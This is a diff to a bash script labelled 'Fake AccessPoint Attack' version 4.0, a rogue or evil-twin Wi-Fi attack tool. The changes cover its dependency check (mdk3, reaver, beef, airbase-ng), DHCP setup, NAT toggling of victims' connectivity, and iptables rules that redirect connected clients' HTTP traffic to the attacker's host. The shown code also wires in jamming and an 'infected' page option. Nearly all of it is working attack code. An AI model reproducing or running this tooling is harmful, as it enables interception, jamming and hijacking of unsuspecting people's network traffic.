@@ -34,7 +34,7 @@ ${Red}  / /\ / _ \/ _  |/ _  | | | | | ${White}|/|${Yellow} \ \| |/ _  |  _ \ / 
 ${Red} / /_//  __/ (_| | (_| | | |_| | ${White}|\|${Yellow} _\ \ | (_| | | | | (_| | \__ |
 ${Red}/___ / \___|\__ _|\__ _|_|\__  | ${White}|/|${Yellow} \__/_|\__  |_| |_|\__ _|_|___/
 ${Red}                          |___/           ${Yellow} |___/
-${Yellow}   Fake AccessPoint Attack ${Blue}Version 3.0 Beta ${White}Created By${Red}:${Yellow}0V3rK!113R
+${Yellow}   Fake AccessPoint Attack ${Blue}Version 4.0 Beta ${White}Created By${Red}:${Yellow}0V3rK!113R
 
 	${Color_Off}"""
 }
@@ -58,7 +58,7 @@ function hard_interrupt {
 		sleep 3
 	fi
 
-	echo -e "[${Red}x$Color_Off]Turnoff broadcast"
+	echo -e "\n[${Red}x$Color_Off]Turnoff broadcast"
 	killall hostapd &> /dev/null
 	sleep 2
 
@@ -84,7 +84,11 @@ function hard_interrupt {
 	KILL_FUSER=$(fuser -k 53/tcp 2> /dev/null)
 
 	echo -e "[${Red}x$Color_Off]Restarting the network"
-	ALL_INTERFACE_RESET=$(systemctl restart network-manager > /dev/null)
+	if [[ $SYSTEM_DISTRO == "Arch" ]]; then
+		ALL_INTERFACE_RESET=$(systemctl restart NetworkManager > /dev/null)
+	else
+		ALL_INTERFACE_RESET=$(systemctl restart network-manager > /dev/null)
+	fi
 
 	echo -e "[${Red}x$Color_Off]Turnoff network redirection"
 	REDIRECTION_OFF=$(echo 0 > /proc/sys/net/ipv4/ip_forward)
@@ -105,8 +109,8 @@ function hard_interrupt {
 
 
 	echo -e "[${Red}x${Color_Off}]Clearing the files"
-	WIPE_DHCP=$(echo 0 > /etc/dhcp/dhcpd.conf)
 	rm .* 2> /dev/null
+	rm files/.* 2> /dev/null
 
 	killall hostapd 2> /dev/null
 	killall dhcpd 2> /dev/null
@@ -145,49 +149,24 @@ function hard_interrupt {
 function check_root {
 
 	if [ $USER != root ]
-		then echo -e "$Red[x]You don't have root user privilages"
+		then echo -e "$Red[x]You don't have root user privilages${Color_Off}"
 		exit 1
 	else
 		clear
 	fi
 }
 
+##Complete this function to check for all files##
+
 function check_files {
-	if [ -f /usr/share/man/man8/dnsmasq.8.gz ]
-		then echo -e "[${Green}+${Color_Off}]dnsmasq Installed"
-		sleep 0.1
-	else
-		echo -e "[${Red}x${Color_Off}]dnsmasq not Installed!"
-		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
-		exit 1
-	fi
-
-	if [ -f /usr/sbin/airmon-ng ]
-		then echo -e "[${Green}+${Color_Off}]airmon-ng Installed"
-		sleep 0.1
-	else
-		echo -e "[${Red}x${Color_Off}]airmon-ng not Installed"
-		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
-		exit 1
-	fi
-
-	if [ -f /usr/sbin/airbase-ng ]
-		then echo -e "[${Green}+${Color_Off}]airbase-ng Installed"
-		sleep 0.1
-	else
-		echo -e "[${Red}x${Color_Off}]airbase-ng not Installed"
-		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
-		exit 1
-	fi
-
-	if [ -d /usr/share/iptables/ ]
-		then echo -e "[${Green}+${Color_Off}]iptables Installed"
+	files=( "iptables" "dnsmasq" "airmon-ng" "airbase-ng" "macchanger" "hostapd" "mdk3" "openssl" "reaver" "beef" "xterm" "wvdial" "iw" )	
+	
+	for i in ${files[@]};do
+		echo -e "[+]Check $i";which $i &> /dev/null
+		if [ $? != 0 ];then echo -e "[${Red}x${Color_Off}]Missing Tools!";exit 1;fi
 		sleep 0.5
-	else
-		echo -e "[${Red}x${Color_Off}]iptables not Installed"
-		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
-		exit 1
-	fi
+	done	
+
 	echo -e "[${Yellow}+${Color_Off}]Starting"
 	sleep 1
 	clear
@@ -263,33 +242,38 @@ function Informations {
 		fi
 	fi
 
-	DUAL_NIC=$(ip -o -4 route show to default | awk '{print $5}' | wc -l)
-	NAME_NIC=$(ip -o -4 route show to default | awk '{print $5}')
+	echo -e "[${Blue}?${Color_Off}]Choose connection type:\n"
+	echo -e "[${Yellow}1${Color_Off}]Online"
+	echo -e "[${Yellow}2${Color_Off}]Offline"
+	header
+	read CONNECTION_TYPE
 
+	NIC=$(ip link show | awk '{print $2}' | tr -d ':' | grep wl)
+	for i in $NIC;do echo "[*]$i";done
 
-	if [[ $DUAL_NIC -ge 2 ]]; then 
-		ip -o -4 route show to default | awk '{print $5}' > .upinterfaces
-		NIC_1=$(sed '1q;d' .upinterfaces)
-		NIC_2=$(sed '2q;d' .upinterfaces)
-		NIC_3=$(sed '3q;d' .upinterfaces)
-		echo -e "${Red}[${Yellow}*${Red}]${Color_Off} $NIC_1"
-		echo -e "${Red}[${Yellow}*${Red}]${Color_Off} $NIC_2"
-		echo -e "${Red}[${Yellow}*${Red}]${Color_Off} $NIC_3  "
-		## have to check if input correct ##
+	## have to check if input correct ##
 
-		echo -e "\n[${Blue}?${Color_Off}]Which interface you will use to broadcast your wifi signal?"
-		header
-		read BROADCAST_INTERFACE
-		
-		printf "[${Blue}*${Color_Off}]Check NL80211 ${Red}"
+	echo -e "\n[${Blue}?${Color_Off}]Which interface you will use to broadcast your wifi signal?"
+	header
+	read BROADCAST_INTERFACE
+
+	printf "[${Blue}*${Color_Off}]Check NL80211 ${Red}"
 								  	
-		WIFI_CARD_KERNEL_MODULE=$(ls /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/ | sed 's/.*://')
-		NL_SUPPORT=$(modinfo $WIFI_CARD_KERNEL_MODULE | grep 'depend' | grep 'mac80211' > /dev/null)
+	WIFI_CARD_KERNEL_MODULE=$(ls /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/ | sed 's/.*://')
+	NL_SUPPORT=$(modinfo $WIFI_CARD_KERNEL_MODULE | grep 'depend' | grep 'mac80211' > /dev/null)
 		
-		if [[ $? == 0 ]];then printf "${Green}.. OK${Color_Off}\n"
+	if [[ $? == 0 ]];then printf "${Green}.. OK${Color_Off}\n"
 		
-		else printf "${Red}.. NOT SUPPORTED";echo -e "\n${Color_Off}[${Red}x${Color_Off}]Your wireless card doesn't met the requirements to act as AccessPoint";exit 1
+	else printf "${Red}.. NOT SUPPORTED";echo -e "\n${Color_Off}[${Red}x${Color_Off}]Your wireless card doesn't met the requirements to act as AccessPoint";exit 1
 
+	fi
+	if [ $CONNECTION_TYPE = 1 ];then
+		
+		if [ $(ip link show | awk '{print $2}' | tr -d ':' | grep wl | wc -l) -lt 2 ];then
+			echo -e "[${Red}x${Color_Off}]Error:only one network interface detected!"
+			echo -e "[${Yellow}!${Color_Off}]You should have at least 2 network cards to broadcast the signal and provide the internet connection"
+			echo -e "[${Yellow}!${Color_Off}]Make sure that the both network interfaces are connected to the internet to make it easy to detect them"
+			exit 1
 		fi
 
 		echo -e "\n[${Blue}?${Color_Off}]Which interface you will use to provide the internet connection?"
@@ -299,17 +283,13 @@ function Informations {
 		## Check if the online interface is online ##
 
 		ONLINE_INTERFACE_CHECK=$(more /sys/class/net/$ONLINE_INTERFACE/operstate)
-		if [ $ONLINE_INTERFACE_CHECK != up ]
-			then echo "\n[${Red}x${Color_Off}]Make sure that the interface that will provide internet connection is online!"
-			exit 1
+		if [ $ONLINE_INTERFACE_CHECK != up ];then 
+				echo -e "\n[${Red}x${Color_Off}]Make sure that the interface that will provide internet connection is online!";exit 1
 		fi
 
-	else
-		echo -e "[${Red}x${Color_Off}]Error:only one network interface detected!"
-		echo -e "[${Yellow}!${Color_Off}]You should have at least 2 network cards to broadcast the signal and provide the internet connection"
-		echo -e "[${Yellow}!${Color_Off}]Make sure that the both network interfaces are connected to the internet to make it easy to detect them"
-		exit 1
 	fi
+
+	if [ $CONNECTION_TYPE = 2 ];then echo -e "[${Yellow}!${Color_Off}]Skip online detection";fi
 
 	if [ -d /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/ ]
 		then NETWORK_CARD=$(ls /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/)
@@ -349,7 +329,7 @@ option broadcast-address
 
 ##--Domain name servers--##
 option domain-name-servers
-10.0.0.1, 8.8.8.8, 8.8.4.4;
+10.0.0.1, 1.1.1.1, 1.1.1.0;
 option time-offset
 0;
 
@@ -357,9 +337,8 @@ option time-offset
 range 10.0.0.3 10.0.0.100;
 default-lease-time 1209600;
 max-lease-time 1814400;
-}""" > /etc/dhcp/dhcpd.conf
-	if [[ ! -f /var/lib/dhcp/dhcpd.leases ]]; then touch /var/lib/dhcp/dhcpd.leases; fi
-	dhcpd $MON_INTERFACE  2> /dev/null &
+}""" > .dhcpd.conf
+	dhcpd -cf .dhcpd.conf $MON_INTERFACE 2> /dev/null &
 }
 
 function ap_conf {
@@ -439,11 +418,11 @@ function set_ips {
 	route add -net $IP_NETWORK netmask $NETMASK gw $GATEWAY
 	echo 1 > /proc/sys/net/ipv4/ip_forward
 	iptables -P FORWARD ACCEPT
-	iptables -t nat -A POSTROUTING -o $ONLINE_INTERFACE -j MASQUERADE
+	if [ $CONNECTION_TYPE = 1 ];then iptables -t nat -A POSTROUTING -o $ONLINE_INTERFACE -j MASQUERADE;fi
 }
 #===================================>ATTACK LIST
 function redirecting_start {
-	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
+	HOST_IP=($(ip route get 1.1.1.1 | awk '{print $NF; exit }'))
 	echo -e "[${Blue}*${Color_Off}]Redirecting http requests"
 	iptables --append FORWARD --in-interface $MON_INTERFACE -j ACCEPT
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80
@@ -505,7 +484,7 @@ function redirecting_start {
 }
 
 function redirecting_stop {
-	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
+	HOST_IP=($(ip route get 1.1.1.1 | awk '{print $NF; exit }'))
 	echo -e "[${Red}*${Color_Off}]Reset the redirection rules.."
 	iptables -D FORWARD --in-interface $MON_INTERFACE -j ACCEPT 2> /dev/null
 	iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80 2> /dev/null
@@ -662,14 +641,14 @@ function jamming_attack_stop {
 }
 
 function attack_options {
-	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
+	HOST_IP=($(ip route get 1.1.1.1 | awk '{print $NF; exit }'))
 	while [[ true ]]; do
 		clear
 		banner
-		if iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null;then
-			echo -e "\n${Red}●${Color_Off} Connection Status - Offline\n"
-		else
+		if iptables --table nat --list-rules | grep "POSTROUTING -o $ONLINE_INTERFACE" > /dev/null;then
 			echo -e "\n${Green}●${Color_Off} Connection Status - Online\n"
+		else
+			echo -e "\n${Red}●${Color_Off} Connection Status - Offline\n"
 		fi
 		if ps -A | grep -q mdk3; then
 			echo -e "${Green}(${BRed}*${Purple}/${BRed}*${Green})${Color_Off}Jamming is activated\n"
@@ -719,31 +698,33 @@ function attack_options {
 
 		# Connection OFF #
 		elif [ $ATTACKOPTION = 5 ]
-			then RULES_EXIST=$(iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null)
-			if [ $? != 0 ]
-				then echo -e "\n[${Green}+${Color_Off}]Go Offline.."
-				iptables -A FORWARD -p tcp -j REJECT
-				iptables -A FORWARD -p icmp -j REJECT
-			else
-				echo -e "\n[${Red}x${Color_Off}]Connection is already ${Red}OFF${Color_Off}"
-				sleep 3
-			fi
+			then 
+				iptables --table nat --list-rules | grep "POSTROUTING -o $ONLINE_INTERFACE" > /dev/null
+				if [[ $? = 0 ]];then
+					echo -e "\n[${Green}+${Color_Off}]Go Offline.."
+					sleep 3
+					if [[ $CONNECTION_TYPE = 1 ]];then 
+							iptables --table nat -D POSTROUTING -o $ONLINE_INTERFACE -j MASQUERADE
+					else 
+							echo -e "\n[${Red}x${Color_Off}]Connection is already ${Red}OFF${Color_Off}";sleep 3
+					fi
+				fi
 
-		elif [ $ATTACKOPTION = 6 ]
-			then RULES_EXIST=$(iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null)
-			if [ $? = 0 ]
+		elif [ $ATTACKOPTION = 6 ];then 
+				iptables --table nat --list-rules | grep "POSTROUTING -o $ONLINE_INTERFACE" > /dev/null
+			if [ $? != 0 ]
 				then echo -e "\n[${Green}+${Color_Off}]Go Online.."
-				iptables -D FORWARD -p tcp -j REJECT
-				iptables -D FORWARD -p icmp -j REJECT
+				sleep 3
+				iptables --table nat -A POSTROUTING -o $ONLINE_INTERFACE -j MASQUERADE
 			else
 				echo -e "\n[${Red}x${Color_Off}]Connection is already ${Green}ON${Color_Off}"
 				sleep 3
 
 			fi
 
-		elif [ $ATTACKOPTION = 7 ]
-			then xterm -geometry 71x29+0+200 -bg "#000000" -title ConnectedDevices -e sudo watch -c -n 8 -t bash files/devices &
-
+		elif [ $ATTACKOPTION = 7 ];then 
+			xterm -geometry 71x33+0+200 -bg "#000000" -title ConnectedDevices -e watch -c -n 6 -t files/devices $MON_INTERFACE &
+		
 		elif [ $ATTACKOPTION = 8 ]
 			then infected_index
 
